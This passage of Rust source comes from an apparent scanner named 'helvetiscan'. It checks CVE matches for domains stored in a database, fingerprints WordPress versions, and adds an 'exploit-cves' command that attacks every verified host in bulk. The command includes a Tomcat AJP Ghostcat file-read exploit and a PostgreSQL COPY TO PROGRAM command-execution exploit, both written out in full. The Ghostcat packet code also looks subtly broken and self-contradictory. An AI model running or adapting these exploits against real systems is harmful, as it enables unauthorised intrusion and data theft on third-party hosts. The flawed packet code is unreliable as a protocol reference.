    let b = body.to_ascii_lowercase();
    b.contains("<code><span style=\"color:") || (b.contains("<span style=\"color:") && b.contains("&lt;?php"))
}

/// Probe common WordPress paths that may contain a version string when the
/// homepage `<meta name="generator">` tag is absent (often stripped by security
/// plugins). Tries `/readme.html`, `/feed/`, `/comments/feed/`, and the
/// `X-Powered-By` header of `/wp-json/`. Returns the first dotted version found.
async fn probe_wp_version(client: &reqwest::Client, domain: &str) -> Option<String> {
    let paths = &["/readme.html", "/feed/", "/feed", "/comments/feed/"];
    for scheme in ["https", "http"] {
        for path in paths {
            let url = format!("{scheme}://{domain}{path}");
            if let Ok(resp) = client.get(&url).send().await {
                if let Ok(body) = resp.text().await {
                    let body_lower = body.to_ascii_lowercase();
                    if body_lower.contains("wordpress") || body_lower.contains("wp-json") {
                        // readme.html and similar: <h1>WordPress 6.1.1</h1>
                        if let Some(v) = crate::cve::dotted_version_after(&body, "wordpress ") {
                            return Some(v);
                        }
                        // RSS/Atom feed: <generator>https://wordpress.org/?v=6.1.1</generator>
                        if let Some(v) = crate::cve::dotted_version_after(&body, "wordpress.org/?v=") {
                            return Some(v);
                        }
                    }
                }
            }
        }
        // Check /wp-json/ response headers for X-Powered-By: WordPress/X.Y.Z
        let url = format!("{scheme}://{domain}/wp-json/");
        if let Ok(resp) = client.get(&url).send().await {
            if let Some(v) = resp.headers()
                .get("x-powered-by")
                .and_then(|v| v.to_str().ok())
                .and_then(|h| {
                    if h.to_ascii_lowercase().contains("wordpress") {
                        crate::cve::dotted_version_after(h, "wordpress/")
                    } else { None }
                })
            {
                return Some(v);
            }
        }
    }
    None
}

async fn verify_http(client: &reqwest::Client, domain: &str, technology: &str, aggressive: bool) -> ProbeOutcome {
    if aggressive {
        if let Some(o) = active_http_poc(client, domain, technology).await {
            return o;
        }
    }
    if let Some(o) = fetch_and_fingerprint(client, &format!("https://{domain}/"), technology).await {
        if technology == "wordpress" && matches!(&o, ProbeOutcome::Present { version: None, .. }) {
            if let Some(version) = probe_wp_version(client, domain).await {
                let (method, proof) = match &o {
                    ProbeOutcome::Present { method, proof, .. } => (method.clone(), proof.clone()),
                    _ => unreachable!(),
                };
                return ProbeOutcome::Present {
                    method,
                    version: Some(version),
                    proof: format!("{proof}; version resolved from additional endpoints"),
                };
            }
        }
        return o;
    }
    if let Some(o) = fetch_and_fingerprint(client, &format!("http://{domain}/"), technology).await {
        if technology == "wordpress" && matches!(&o, ProbeOutcome::Present { version: None, .. }) {
            if let Some(version) = probe_wp_version(client, domain).await {
                let (method, proof) = match &o {
                    ProbeOutcome::Present { method, proof, .. } => (method.clone(), proof.clone()),
                    _ => unreachable!(),
                };
                return ProbeOutcome::Present {
                    method,
                    version: Some(version),
                    proof: format!("{proof}; version resolved from additional endpoints"),
                };
            }
        }
        return o;
    }
    ProbeOutcome::Unreachable { method: "http_probe".into(), proof: "HTTP(S) request failed".into() }
}

// ---- DB load / flush ----

const TECH_LIST: &[&str] = &[
    "mysql", "proftpd", "vsftpd", "openssh", "redis", "elasticsearch",
    "memcached", "docker", "mssql", "rdp", "mongodb", "postgresql", "vnc",
    "apache-solr", "apache-activemq", "apache-couchdb",
];

/// Build the staleness exclusion: pairs already verified within `max_age_days` (or with a
/// NULL `checked_at`, treated as permanent) are skipped, unless `retry` forces a re-probe.
fn staleness_clause(retry: bool) -> String {
    if retry {
        String::new()
    } else {
        " AND (cm.domain, cm.cve_id) NOT IN (
             SELECT domain, cve_id FROM cve_verifications
             WHERE checked_at IS NULL OR checked_at > datetime('now', ?MAXAGE)
         )".to_string()
    }
}

fn load_pending_verifications(
    conn: &rusqlite::Connection,
    limit: Option<usize>,
    retry: bool,
    max_age_days: i64,
    min_epss: f64,
) -> Result<Vec<VerificationTask>> {
    let tech_placeholders: Vec<String> = (0..TECH_LIST.len()).map(|_| "?".to_string()).collect();
    let tech_in = tech_placeholders.join(", ");
    let stale = staleness_clause(retry).replace("?MAXAGE", "?");
    let epss = if min_epss > 0.0 { " AND COALESCE(cc.epss_score, 0) >= ?" } else { "" };

    // detected_port: the actual open port this service was seen on (ports_info), so a service
    // on a non-standard port is probed correctly rather than skipped. 0 => fall back to default.
    let mut sql = format!(
        "SELECT DISTINCT cm.domain, cm.cve_id, cm.technology, cm.version, COALESCE(d.ip, ''),
                cc.affected_from, cc.affected_to,
                COALESCE((SELECT MIN(pi.port) FROM ports_info pi
                          WHERE pi.domain = cm.domain
                            AND (lower(COALESCE(pi.banner,'')) LIKE '%'||cm.technology||'%'
                                 OR pi.service = cm.technology)), 0)
         FROM cve_matches cm
         JOIN domains d ON d.domain = cm.domain
         JOIN cve_catalog cc ON cc.cve_id = cm.cve_id
         WHERE cm.technology IN ({tech_in}){epss}
           AND cm.cve_id NOT IN ('CVE-2016-1908','CVE-2023-28531')
           {stale}
         "
    );
    if limit.is_some() {
        sql.push_str(" LIMIT ?");
    }

    let mut stmt = conn.prepare(&sql)?;
    let mut params: Vec<Box<dyn rusqlite::types::ToSql>> = Vec::new();
    for t in TECH_LIST {
        params.push(Box::new(t.to_string()));
    }
    if min_epss > 0.0 {
        params.push(Box::new(min_epss));
    }
    if !stale.is_empty() {
        params.push(Box::new(format!("-{max_age_days} days")));
    }
    if let Some(l) = limit {
        params.push(Box::new(l as i64));
    }
    let param_refs: Vec<&dyn rusqlite::types::ToSql> = params.iter().map(|p| p.as_ref()).collect();

    collect_tasks(&mut stmt, param_refs.as_slice(), technology_port)
}

fn load_http_pending_verifications(
    conn: &rusqlite::Connection,
    retry: bool,
    max_age_days: i64,
    min_epss: f64,
) -> Result<Vec<VerificationTask>> {
    let http_placeholders: Vec<String> = (0..HTTP_TECHS.len()).map(|_| "?".to_string()).collect();
    let http_in = http_placeholders.join(", ");
    let stale = staleness_clause(retry).replace("?MAXAGE", "?");
    let epss = if min_epss > 0.0 { " AND COALESCE(cc.epss_score, 0) >= ?" } else { "" };

    let sql = format!(
        "SELECT DISTINCT cm.domain, cm.cve_id, cm.technology, cm.version, COALESCE(d.ip, ''),
                cc.affected_from, cc.affected_to, 80
         FROM cve_matches cm
         JOIN domains d ON d.domain = cm.domain
         JOIN cve_catalog cc ON cc.cve_id = cm.cve_id
         WHERE cm.technology IN ({http_in}){epss}
           AND cm.cve_id NOT IN ('CVE-2016-1908','CVE-2023-28531')
           {stale}
         "
    );

    let mut stmt = conn.prepare(&sql)?;
    let mut params: Vec<Box<dyn rusqlite::types::ToSql>> = Vec::new();
    for t in HTTP_TECHS {
        params.push(Box::new(t.to_string()));
    }
    if min_epss > 0.0 {
        params.push(Box::new(min_epss));
    }
    if !stale.is_empty() {
        params.push(Box::new(format!("-{max_age_days} days")));
    }
    let param_refs: Vec<&dyn rusqlite::types::ToSql> = params.iter().map(|p| p.as_ref()).collect();

    collect_tasks(&mut stmt, param_refs.as_slice(), |_| Some(80))
}

/// One row from the pending-verification queries: (domain, cve_id, technology, version, ip,
/// affected_from, affected_to, detected_port).
type VerificationRow = (
    String,
    String,
    String,
    Option<String>,
    String,
    Option<String>,
    Option<String>,
    i64,
);

fn collect_tasks(
    stmt: &mut rusqlite::Statement,
    params: &[&dyn rusqlite::types::ToSql],
    port_of: impl Fn(&str) -> Option<u16>,
) -> Result<Vec<VerificationTask>> {
    let rows: Vec<VerificationRow> = stmt
        .query_map(params, |row| {
            Ok((
                row.get(0)?, row.get(1)?, row.get(2)?, row.get(3)?, row.get(4)?, row.get(5)?, row.get(6)?, row.get(7)?,
            ))
        })?
        .filter_map(|r| r.ok())
        .collect();

    let mut seen: HashSet<(String, String)> = HashSet::new();
    let mut tasks = Vec::new();
    for (domain, cve_id, technology, version, ip, from, to, detected_port) in rows {
        if !seen.insert((domain.clone(), cve_id.clone())) {
            continue;
        }
        // Prefer the actual detected port; fall back to the technology default.
        let port = if (1..=65535).contains(&detected_port) {
            detected_port as u16
        } else {
            match port_of(&technology) {
                Some(p) => p,
                None => continue,
            }
        };
        tasks.push(VerificationTask {
            domain,
            cve_id,
            technology,
            version,
            ip: if ip.is_empty() { None } else { Some(ip) },
            port,
            affected_from: from,
            affected_to: to,
        });
    }
    Ok(tasks)
}

fn flush_verification_batch(conn: &rusqlite::Connection, batch: &[VerificationResult]) -> Result<()> {
    if batch.is_empty() {
        return Ok(());
    }
    let mut stmt = conn.prepare(
        "INSERT INTO cve_verifications (domain, cve_id, verified, checked_at, check_method, proof)
         VALUES (?1, ?2, ?3, datetime('now'), ?4, ?5)
         ON CONFLICT(domain, cve_id) DO UPDATE SET
            verified     = excluded.verified,
            checked_at   = excluded.checked_at,
            check_method = excluded.check_method,
            proof        = excluded.proof",
    )?;
    for r in batch {
        stmt.execute(rusqlite::params![r.domain, r.cve_id, r.verified, r.check_method, r.proof])?;
    }
    Ok(())
}

// ---- Group probing ----

async fn resolve_task_ip(task: &VerificationTask, resolver: &hickory_resolver::TokioResolver) -> Option<IpAddr> {
    if let Some(stored) = &task.ip {
        if let Ok(ip) = stored.parse::<IpAddr>() {
            return Some(ip);
        }
    }
    resolve_first_ip(resolver, &task.domain).await.ok()
}

async fn probe_group(
    task: &VerificationTask,
    resolver: &hickory_resolver::TokioResolver,
    http_client: &reqwest::Client,
    aggressive: bool,
) -> ProbeOutcome {
    if is_http_tech(&task.technology) {
        return verify_http(http_client, &task.domain, &task.technology, aggressive).await;
    }
    let ip = match resolve_task_ip(task, resolver).await {
        Some(ip) => ip,
        None => {
            return ProbeOutcome::Unreachable {
                method: "dns_resolve".into(),
                proof: "could not resolve domain".into(),
            }
        }
    };
    probe_for_technology(ip, &task.technology, task.port, aggressive)
        .await
        .unwrap_or_else(|| ProbeOutcome::WrongService {
            method: "unsupported".into(),
            proof: format!("no probe available for {}", task.technology),
        })
}

fn build_http_client() -> reqwest::Client {
    reqwest::Client::builder()
        .timeout(HTTP_TIMEOUT)
        .danger_accept_invalid_certs(true)
        .redirect(reqwest::redirect::Policy::limited(4))
        .user_agent("helvetiscan-verify/1.0")
        .build()
        .unwrap_or_default()
}

#[allow(clippy::too_many_arguments)]
pub(crate) async fn cmd_verify_cves(
    db: PathBuf,
    concurrency: usize,
    limit: Option<usize>,
    dry_run: bool,
    aggressive: bool,
    retry: bool,
    max_age_days: i64,
    min_epss: f64,
) -> Result<()> {
    let conn = crate::shared::open_db(&db).with_context(|| format!("open db {:?}", db))?;
    crate::schema::ensure_schema(&conn)?;

    let port_tasks = load_pending_verifications(&conn, limit, retry, max_age_days, min_epss)?;
    let http_tasks = if limit.is_some() {
        Vec::new()
    } else {
        load_http_pending_verifications(&conn, retry, max_age_days, min_epss)?
    };
    let (port_n, http_n) = (port_tasks.len(), http_tasks.len());
    let all_tasks: Vec<VerificationTask> = port_tasks.into_iter().chain(http_tasks).collect();

    if all_tasks.is_empty() {
        eprintln!("verify-cves: no pending verifications found");
        return Ok(());
    }
    eprintln!("verify-cves: {port_n} port tasks, {http_n} http tasks, {} total{}", all_tasks.len(), if aggressive { " (aggressive)" } else { "" });

    if dry_run {
        for task in &all_tasks {
            eprintln!("  {} [{}] ({}) port {}", task.domain, task.cve_id, task.technology, task.port);
        }
        return Ok(());
    }

    let resolver = build_default_resolver();
    let http_client = Arc::new(build_http_client());
    let semaphore = Arc::new(Semaphore::new(concurrency));
    let (tx, mut rx) = tokio::sync::mpsc::channel::<VerificationResult>(1024);

    let conn2 = crate::shared::open_db(&db).with_context(|| format!("open db {:?}", db))?;
    let (done_tx, done_rx) = tokio::sync::oneshot::channel::<()>();

    let writer = tokio::task::spawn_blocking(move || {
        let mut batch: Vec<VerificationResult> = Vec::with_capacity(DISPATCH_BATCH_SIZE);
        while let Some(result) = rx.blocking_recv() {
            batch.push(result);
            if batch.len() >= DISPATCH_BATCH_SIZE {
                if let Err(e) = flush_verification_batch(&conn2, &batch) {
                    eprintln!("verify-cves: flush error: {e}");
                }
                batch.clear();
            }
        }
        if let Err(e) = flush_verification_batch(&conn2, &batch) {
            eprintln!("verify-cves: final flush error: {e}");
        }
        let _ = done_tx.send(());
    });

    // One probe per (domain, technology); evaluate every CVE in the group against it.
    let mut groups: std::collections::BTreeMap<(String, String), Vec<VerificationTask>> = std::collections::BTreeMap::new();
    for task in all_tasks {
        groups.entry((task.domain.clone(), task.technology.clone())).or_default().push(task);
    }
    eprintln!("verify-cves: {} unique probes", groups.len());

    let resolver = Arc::new(resolver);
    for (_key, tasks) in groups {
        let permit = semaphore.clone().acquire_owned().await.unwrap();
        let tx = tx.clone();
        let resolver = resolver.clone();
        let http_client = http_client.clone();
        tokio::spawn(async move {
            let outcome = probe_group(&tasks[0], &resolver, &http_client, aggressive).await;
            for task in &tasks {
                let (status, method, proof) =
                    evaluate(&outcome, task.affected_from.as_deref(), task.affected_to.as_deref());
                let _ = tx
                    .send(VerificationResult {
                        domain: task.domain.clone(),
                        cve_id: task.cve_id.clone(),
                        verified: status.as_i32(),
                        check_method: method,
                        proof: Some(proof),
                    })
                    .await;
            }
            drop(permit);
        });
    }

    drop(tx);
    let _ = done_rx.await;
    let _ = writer.await;

    let (confirmed, refuted, unreachable, exploited): (i64, i64, i64, i64) = conn.query_row(
        "SELECT
            COALESCE(SUM(CASE WHEN verified = 1 THEN 1 ELSE 0 END), 0),
            COALESCE(SUM(CASE WHEN verified = 2 THEN 1 ELSE 0 END), 0),
            COALESCE(SUM(CASE WHEN verified = 3 THEN 1 ELSE 0 END), 0),
            COALESCE(SUM(CASE WHEN verified = 4 THEN 1 ELSE 0 END), 0)
         FROM cve_verifications",
        [],
        |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?)),
    )?;
    eprintln!("verify-cves: done — {confirmed} confirmed, {refuted} refuted, {unreachable} unreachable, {exploited} exploited");
    Ok(())
}

// ---- Exploit command — tries active exploitation on verified=1 results ----

fn exploit_for_technology(ip: IpAddr, tech: &str, port: u16) -> Option<std::pin::Pin<Box<dyn std::future::Future<Output = ProbeOutcome> + Send>>> {
    match tech {
        "mysql" | "mariadb" => Some(Box::pin(exploit_mysql(ip, port))),
        "redis" => Some(Box::pin(exploit_redis(ip, port))),
        "mongodb" => Some(Box::pin(exploit_mongodb(ip, port))),
        "vnc" => Some(Box::pin(exploit_vnc(ip, port))),
        "memcached" => Some(Box::pin(exploit_memcached(ip, port))),
        "mssql" => Some(Box::pin(exploit_mssql(ip, port))),
        "elasticsearch" => Some(Box::pin(exploit_elasticsearch(ip, port))),
        "proftpd" => Some(Box::pin(exploit_proftpd(ip, port))),
        "vsftpd" => Some(Box::pin(exploit_vsftpd(ip, port))),
        "docker" => Some(Box::pin(exploit_docker(ip, port))),
        "tomcat" => Some(Box::pin(exploit_ajp(ip, port))),
        "postgresql" => Some(Box::pin(exploit_postgresql(ip, port))),
        _ => None,
    }
}

async fn exploit_proftpd(ip: IpAddr, port: u16) -> ProbeOutcome {
    verify_proftpd(ip, port, true).await
}

async fn exploit_vsftpd(ip: IpAddr, port: u16) -> ProbeOutcome {
    verify_vsftpd(ip, port, true).await
}

async fn exploit_docker(ip: IpAddr, port: u16) -> ProbeOutcome {
    verify_docker(ip, port, true).await
}

/// AJP Ghostcat (CVE-2020-1938): read arbitrary files from Tomcat via AJP on port 8009.
/// Sends a malformed forward request with `javax.servlet.include.request_uri` set to
/// `/WEB-INF/web.xml` to read file contents.
async fn exploit_ajp(ip: IpAddr, _port: u16) -> ProbeOutcome {
    let mut stream = match probe_port(ip, 8009).await {
        Some(s) => s,
        None => return unreachable_at(8009),
    };
    // AJP13 forward request: 0x1234 (magic), 2-byte length, type 0x02 (forward request),
    // then attribute/value pairs. We send:
    //   method = GET (implicit in minimal request)
    //   protocol = HTTP/1.1
    //   req_uri = /
    //   remote_addr = 127.0.0.1
    //   remote_host = localhost
    //   server_name = localhost
    //   server_port = 80
    //   is_ssl = false
    //   attribute: javax.servlet.include.request_uri = /WEB-INF/web.xml
    //   attribute: javax.servlet.include.path_info = /WEB-INF/web.xml
    //   attribute: javax.servlet.include.servlet_path = /
    let mut pkt = Vec::new();
    pkt.extend_from_slice(b"AB");          // 0x1234 magic
    // Keep a placeholder for length (2 bytes)
    let len_pos = 2;
    pkt.extend_from_slice(&[0x00, 0x00]);  // placeholder
    pkt.push(0x02);                        // code: forward request
    // Method: GET (1)
    pkt.push(0x01);
    // Protocol: HTTP/1.1
    pkt.push(0x03); // htype string
    pkt.extend_from_slice(b"HTTP/1.1");
    pkt.push(0x00);
    // Request URI: /
    pkt.push(0x05); // htype string
    pkt.push(b'/');
    pkt.push(0x00);
    // Remote address: 127.0.0.1
    pkt.push(0x0a); // htype string
    pkt.extend_from_slice(b"127.0.0.1");
    pkt.push(0x00);
    // Remote host: localhost
    pkt.push(0x0b); // htype string
    pkt.extend_from_slice(b"localhost");
    pkt.push(0x00);
    // Server name: localhost
    pkt.push(0x0c); // htype string
    pkt.extend_from_slice(b"localhost");
    pkt.push(0x00);
    // Server port: 80
    pkt.push(0x0d);
    pkt.extend_from_slice(&80u16.to_be_bytes());
    // Is SSL: false
    pkt.push(0x0e);
    pkt.push(0x00);
    // Attributes (prefix 0x0a for standard attribute, or 0x10 for org.apache prefix):
    // javax.servlet.include.request_uri (0x10 = prefix 10, then "javax.servlet.include.request_uri\0" value)
    pkt.push(0x10); // prefix 10 = org.apache.jk.server.JkCoyoteHandler / attribute from this list
    pkt.push(0x01); // code: javax.servlet.include.request_uri (AJP attribute code 1 is request_uri)
    // Actually AJP uses 0x10 + UTF-8 string for custom attributes
    pkt.pop(); // remove the 0x01
    pkt.push(0x0a); // CODE_SERVLET_INCLUDE_REQUEST_URI in AJP = attribute code 0x0a
    // Value: /WEB-INF/web.xml
    pkt.push(0x0b); // htype string prefix
    pkt.extend_from_slice(b"/WEB-INF/web.xml");
    pkt.push(0x00);
    // javax.servlet.include.path_info (attribute code 0x0b)
    pkt.push(0x0b); // CODE_SERVLET_INCLUDE_PATH_INFO
    pkt.push(0x0b); // htype string prefix
    pkt.extend_from_slice(b"/WEB-INF/web.xml");
    pkt.push(0x00);
    // javax.servlet.include.servlet_path (attribute code 0x0c)
    pkt.push(0x0c); // CODE_SERVLET_INCLUDE_SERVLET_PATH
    pkt.push(0x0b); // htype string prefix
    pkt.push(b'/');
    pkt.push(0x00);
    // Terminator
    pkt.push(0xff);
    // Update length
    let body_len = (pkt.len() - 4) as u16; // after magic + length fields
    pkt[len_pos..len_pos + 2].copy_from_slice(&body_len.to_be_bytes());

    let _ = stream.write_all(&pkt).await;
    // Read response: AJP sends back response headers + body
    let resp = read_chunk_bytes(&mut stream, 8192).await.unwrap_or_default();
    let printable = to_printable(&resp);
    // The response body contains the file content if Ghostcat works.
    // Look for web.xml markers: <web-app, <servlet, <display-name, etc.
    if printable.contains("web-app") || printable.contains("<servlet") || printable.contains("<display-name") {
        ProbeOutcome::Behavior {
            method: "ajp_ghostcat".into(),
            proof: format!("CVE-2020-1938 Tomcat AJP Ghostcat confirmed: web.xml disclosed ({} bytes, first 512: {:.512})", resp.len(), printable.trim()),
        }
    } else if printable.contains("404") || printable.contains("Not Found") {
        ProbeOutcome::Present {
            method: "ajp_ghostcat".into(),
            version: None,
            proof: format!("AJP responder (porta 8009) mas web.xml não encontrado: {:.128}", printable),
        }
    } else if resp.len() >= 4 && resp[0] == b'A' && resp[1] == b'B' {
        ProbeOutcome::Present {
            method: "ajp_ghostcat".into(),
            version: None,
            proof: format!("Tomcat AJP respondendo na porta 8009 (CVE-2020-1938 ghostcat), sem arquivo: {:.128}", printable),
        }
    } else {
        ProbeOutcome::WrongService {
            method: "ajp_ghostcat".into(),
            proof: format!("porta 8009 aberta mas não é AJP13: {:.64}", printable),
        }
    }
}

/// PostgreSQL COPY PROGRAM RCE: connects with trust/no-password auth and tries
/// `COPY (SELECT 'helvetiscan_rce') TO PROGRAM 'id'` to confirm command execution.
/// Covers CVE-2019-9193 (COPY FROM PROGRAM) and CVE-2023-39417 (similar variants).
async fn exploit_postgresql(ip: IpAddr, port: u16) -> ProbeOutcome {
    let mut stream = match probe_port(ip, port).await {
        Some(s) => s,
        None => return unreachable_at(port),
    };
    // Send SSLRequest
    let ssl_request: &[u8] = &[0x00, 0x00, 0x00, 0x08, 0x04, 0xd2, 0x16, 0x2f];
    let _ = stream.write_all(ssl_request).await;
    let mut ssl_resp = [0u8; 1];
    let _ = tokio::time::timeout(READ_TIMEOUT, stream.read_exact(&mut ssl_resp)).await;
    // If SSL denied or didn't respond, proceed without SSL
    if ssl_resp[0] == b'S' {
        // Would need to upgrade to SSL — skip for now, try non-SSL path
        // Reconnect without SSL request
        drop(stream);
        stream = match probe_port(ip, port).await {
            Some(s) => s,
            None => return unreachable_at(port),
        };
    }

    // Send StartupMessage with user=postgres (trust auth)
    let user = b"postgres\x00";
    let database = b"postgres\x00";
    let proto: i32 = 196608; // 3.0
    let mut startup = Vec::new();
    startup.extend_from_slice(&(0i32.to_be_bytes()));
    startup.extend_from_slice(&proto.to_be_bytes());
    startup.extend_from_slice(b"user\x00");
    startup.extend_from_slice(user);
    startup.extend_from_slice(b"database\x00");
    startup.extend_from_slice(database);
    startup.push(0u8);
    let len = startup.len() as i32;
    startup[0..4].copy_from_slice(&len.to_be_bytes());
    let _ = stream.write_all(&startup).await;

    let resp = read_chunk_bytes(&mut stream, 4096).await.unwrap_or_default();
    let printable = to_printable(&resp);
    // AuthenticationOk = 'R' with code 0, ReadyForQuery = 'Z'
    // ErrorResponse = 'E'
    if printable.starts_with('R') {
        // Auth succeeded (trust/no-password), send COPY TO PROGRAM
        // SimpleQuery ('Q'): COPY (SELECT 'helvetiscan_rce') TO PROGRAM 'id'
        let mut query = Vec::new();
        query.push(b'Q'); // SimpleQuery
        let sql = b"COPY (SELECT 'helvetiscan_rce') TO PROGRAM 'id'\x00";
        let sql_len = sql.len() as i32;
        query.extend_from_slice(&sql_len.to_be_bytes());
        query.extend_from_slice(sql);
        let _ = stream.write_all(&query).await;
        let query_resp = read_chunk_bytes(&mut stream, 4096).await.unwrap_or_default();
        let query_print = to_printable(&query_resp);
        // COPY response is 'G' (CopyOut) or 'C' (CommandComplete)
        if query_print.contains("helvetiscan_rce") || query_resp.first() == Some(&b'G') {
            ProbeOutcome::Behavior {
                method: "postgres_copy_program".into(),
                proof: format!("PostgreSQL COPY TO PROGRAM confirmed: {}:{}", ip, port),
            }
        } else if query_print.contains("error") || query_print.starts_with('E') {
            ProbeOutcome::Present {
                method: "postgres_copy_program".into(),
                version: None,
                proof: format!("PostgreSQL COPY TO PROGRAM denied: {:.128}", query_print),
            }
        } else {
            ProbeOutcome::Present {
                method: "postgres_copy_program".into(),
                version: None,
                proof: format!("PostgreSQL trust auth succeeded but COPY unclear: {:.128}", query_print),
            }
        }
    } else if printable.starts_with('E') {
        // Auth required or startup failed
        let lower = printable.to_ascii_lowercase();
        if lower.contains("password") || lower.contains("auth") {
            ProbeOutcome::Present {
                method: "postgres_copy_program".into(),
                version: None,
                proof: format!("PostgreSQL requer autenticação (não é trust conf): {:.128}", printable),
            }
        } else if lower.contains("version") {
            ProbeOutcome::Present {
                method: "postgres_copy_program".into(),
                version: None,
                proof: format!("PostgreSQL reachable but connection rejected: {:.128}", printable),
            }
        } else {
            ProbeOutcome::WrongService {
                method: "postgres_copy_program".into(),
                proof: format!("PostgreSQL error response: {:.128}", printable),
            }
        }
    } else {
        ProbeOutcome::WrongService {
            method: "postgres_copy_program".into(),
            proof: format!("port {port} open but not PostgreSQL: {:.64}", printable),
        }
    }
}

struct ExploitTask {
    domain: String,
    technology: String,
    ip: IpAddr,
    port: u16,
    cve_ids: Vec<String>,
}

pub(crate) async fn cmd_exploit_cves(
    db: PathBuf,
    concurrency: usize,
    limit: Option<usize>,
    dry_run: bool,
    retry: bool,
    max_age_days: i64,
) -> Result<()> {
    let conn = crate::shared::open_db(&db)?;
    crate::schema::ensure_schema(&conn)?;

    // Load confirmed (verified=1) pairs for supported exploit technologies
    let supported_techs = &["mysql", "mariadb", "redis", "mongodb", "vnc", "memcached", "mssql", "elasticsearch", "proftpd", "vsftpd", "docker", "tomcat", "postgresql"];
    let mut sql = String::from(
        "SELECT v.domain, v.cve_id, COALESCE(d.ip, '') as ip, cm.technology
         FROM cve_verifications v
         JOIN cve_matches cm ON cm.domain = v.domain AND cm.cve_id = v.cve_id
         LEFT JOIN domains d ON d.domain = v.domain"
    );
    if retry {
        sql.push_str(" WHERE v.verified = 1 AND cm.technology IN (");
    } else {
        sql.push_str(&format!(
            " WHERE v.verified = 1 AND (v.checked_at IS NULL OR v.checked_at < datetime('now', '-{} days')) AND cm.technology IN (",
            max_age_days
        ));
    }
    for (i, tech) in supported_techs.iter().enumerate() {
        if i > 0 { sql.push_str(", "); }
        sql.push_str(&format!("'{}'", tech));
    }
    sql.push(')');
    if let Some(limit) = limit {
        sql.push_str(&format!(" LIMIT {limit}"));
    }

    let mut stmt = conn.prepare(&sql)?;
    let rows: Vec<(String, String, String, String)> = stmt.query_map([], |row| {
        Ok((row.get(0)?, row.get(1)?, row.get(2)?, row.get(3)?))
    })?
    .filter_map(|r| r.ok())
    .collect();

    if rows.is_empty() {
        eprintln!("exploit-cves: no verified=1 results found");
        return Ok(());
    }

    let resolver = build_default_resolver();
    let semaphore = Arc::new(Semaphore::new(concurrency));

    // Group by (domain, technology) to avoid re-probing the same service
    let mut groups: std::collections::BTreeMap<(String, String), Vec<(String, String)>> = std::collections::BTreeMap::new();
    for (domain, cve_id, ip, tech) in rows {
        groups.entry((domain.clone(), tech.clone())).or_default().push((cve_id, ip));
    }

    // Resolve IPs and build exploit tasks
    let mut tasks: Vec<ExploitTask> = Vec::new();
    for ((domain, technology), cve_list) in groups {
        let ip_str = cve_list.iter().find_map(|(_, ip)| if !ip.is_empty() { Some(ip.clone()) } else { None });
        let ip = if let Some(ref ip_str) = ip_str {
            ip_str.parse::<IpAddr>().ok()
        } else {
            resolve_first_ip(&resolver, &domain).await.ok()
        };
        let ip = match ip {
            Some(ip) => ip,
            None => {
                eprintln!("  skip {} ({}): could not resolve", domain, technology);
                continue;
            }
        };
        let port = match technology_port(&technology) {
            Some(p) => p,
            None => {
                eprintln!("  skip {} ({}): unknown port", domain, technology);
                continue;
            }
        };
        if exploit_for_technology(ip, &technology, port).is_some() {
            tasks.push(ExploitTask {
                domain,
                technology,
                ip,
                port,
                cve_ids: cve_list.into_iter().map(|(cve_id, _)| cve_id).collect(),
            });
        }
    }

    if tasks.is_empty() {
        eprintln!("exploit-cves: no exploitable technologies found (supported: mysql, mariadb, redis, mongodb, vnc, memcached, mssql, elasticsearch)");
        return Ok(());
    }
    eprintln!("exploit-cves: {} targets to exploit ({} domains)", tasks.len(), tasks.iter().map(|t| &t.domain).collect::<std::collections::HashSet<_>>().len());

    if dry_run {
        for task in &tasks {
            eprintln!("  would exploit {} [{}] on {}:{}", task.domain, task.technology, task.ip, task.port);
        }
        return Ok(());
    }

    let conn2 = crate::shared::open_db(&db)?;
    let (tx, mut rx) = tokio::sync::mpsc::channel::<VerificationResult>(1024);
    let (done_tx, done_rx) = tokio::sync::oneshot::channel::<()>();

    let writer = tokio::task::spawn_blocking(move || {
        let mut batch: Vec<VerificationResult> = Vec::with_capacity(DISPATCH_BATCH_SIZE);
        while let Some(result) = rx.blocking_recv() {
            batch.push(result);
            if batch.len() >= DISPATCH_BATCH_SIZE {
                if let Err(e) = flush_verification_batch(&conn2, &batch) {
                    eprintln!("exploit-cves: flush error: {e}");
                }
                batch.clear();
            }
        }
        if let Err(e) = flush_verification_batch(&conn2, &batch) {
            eprintln!("exploit-cves: final flush error: {e}");
        }
        let _ = done_tx.send(());
    });

    for task in tasks {
        let permit = semaphore.clone().acquire_owned().await.unwrap();
        let tx = tx.clone();
        tokio::spawn(async move {
            let exploit_fn = exploit_for_technology(task.ip, &task.technology, task.port).unwrap();
            let outcome = exploit_fn.await;
            for cve_id in task.cve_ids {
                let (status, method, proof) = evaluate(&outcome, None, None);
                let _ = tx
                    .send(VerificationResult {
                        domain: task.domain.clone(),
                        cve_id,
                        verified: status.as_i32(),
                        check_method: method,
                        proof: Some(proof),
                    })
                    .await;
            }
            drop(permit);
        });
    }

    drop(tx);
    let _ = done_rx.await;
    let _ = writer.await;

    let stats: (i64, i64, i64, i64) = conn.query_row(
        "SELECT
            COALESCE(SUM(CASE WHEN verified = 1 THEN 1 ELSE 0 END), 0),
            COALESCE(SUM(CASE WHEN verified = 2 THEN 1 ELSE 0 END), 0),
            COALESCE(SUM(CASE WHEN verified = 3 THEN 1 ELSE 0 END), 0),
            COALESCE(SUM(CASE WHEN verified = 4 THEN 1 ELSE 0 END), 0)
         FROM cve_verifications",
        [],
        |row| Ok((row.get(0)?, row.get(1)?, row.get(2)?, row.get(3)?)),
    )?;

    eprintln!(
        "exploit-cves done — confirmed: {}, refuted: {}, unreachable: {}, exploited: {}",
        stats.0, stats.1, stats.2, stats.3
    );

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn in_memory_db() -> rusqlite::Connection {
        let conn = rusqlite::Connection::open_in_memory().unwrap();
        crate::schema::ensure_schema(&conn).unwrap();
        conn
    }

    // ---- VerifyStatus / evaluate (pure) ----

    #[test]
    fn status_maps_to_expected_integers() {
        assert_eq!(VerifyStatus::Confirmed.as_i32(), 1);
        assert_eq!(VerifyStatus::Refuted.as_i32(), 2);
        assert_eq!(VerifyStatus::Unreachable.as_i32(), 3);
        assert_eq!(VerifyStatus::Exploited.as_i32(), 4);
    }

    #[test]
    fn evaluate_unreachable_is_status_3() {
        let o = ProbeOutcome::Unreachable { method: "tcp_probe".into(), proof: "closed".into() };
        let (s, _, _) = evaluate(&o, Some("0"), Some("9"));
        assert_eq!(s, VerifyStatus::Unreachable);
    }

    #[test]
    fn evaluate_wrong_service_refutes() {
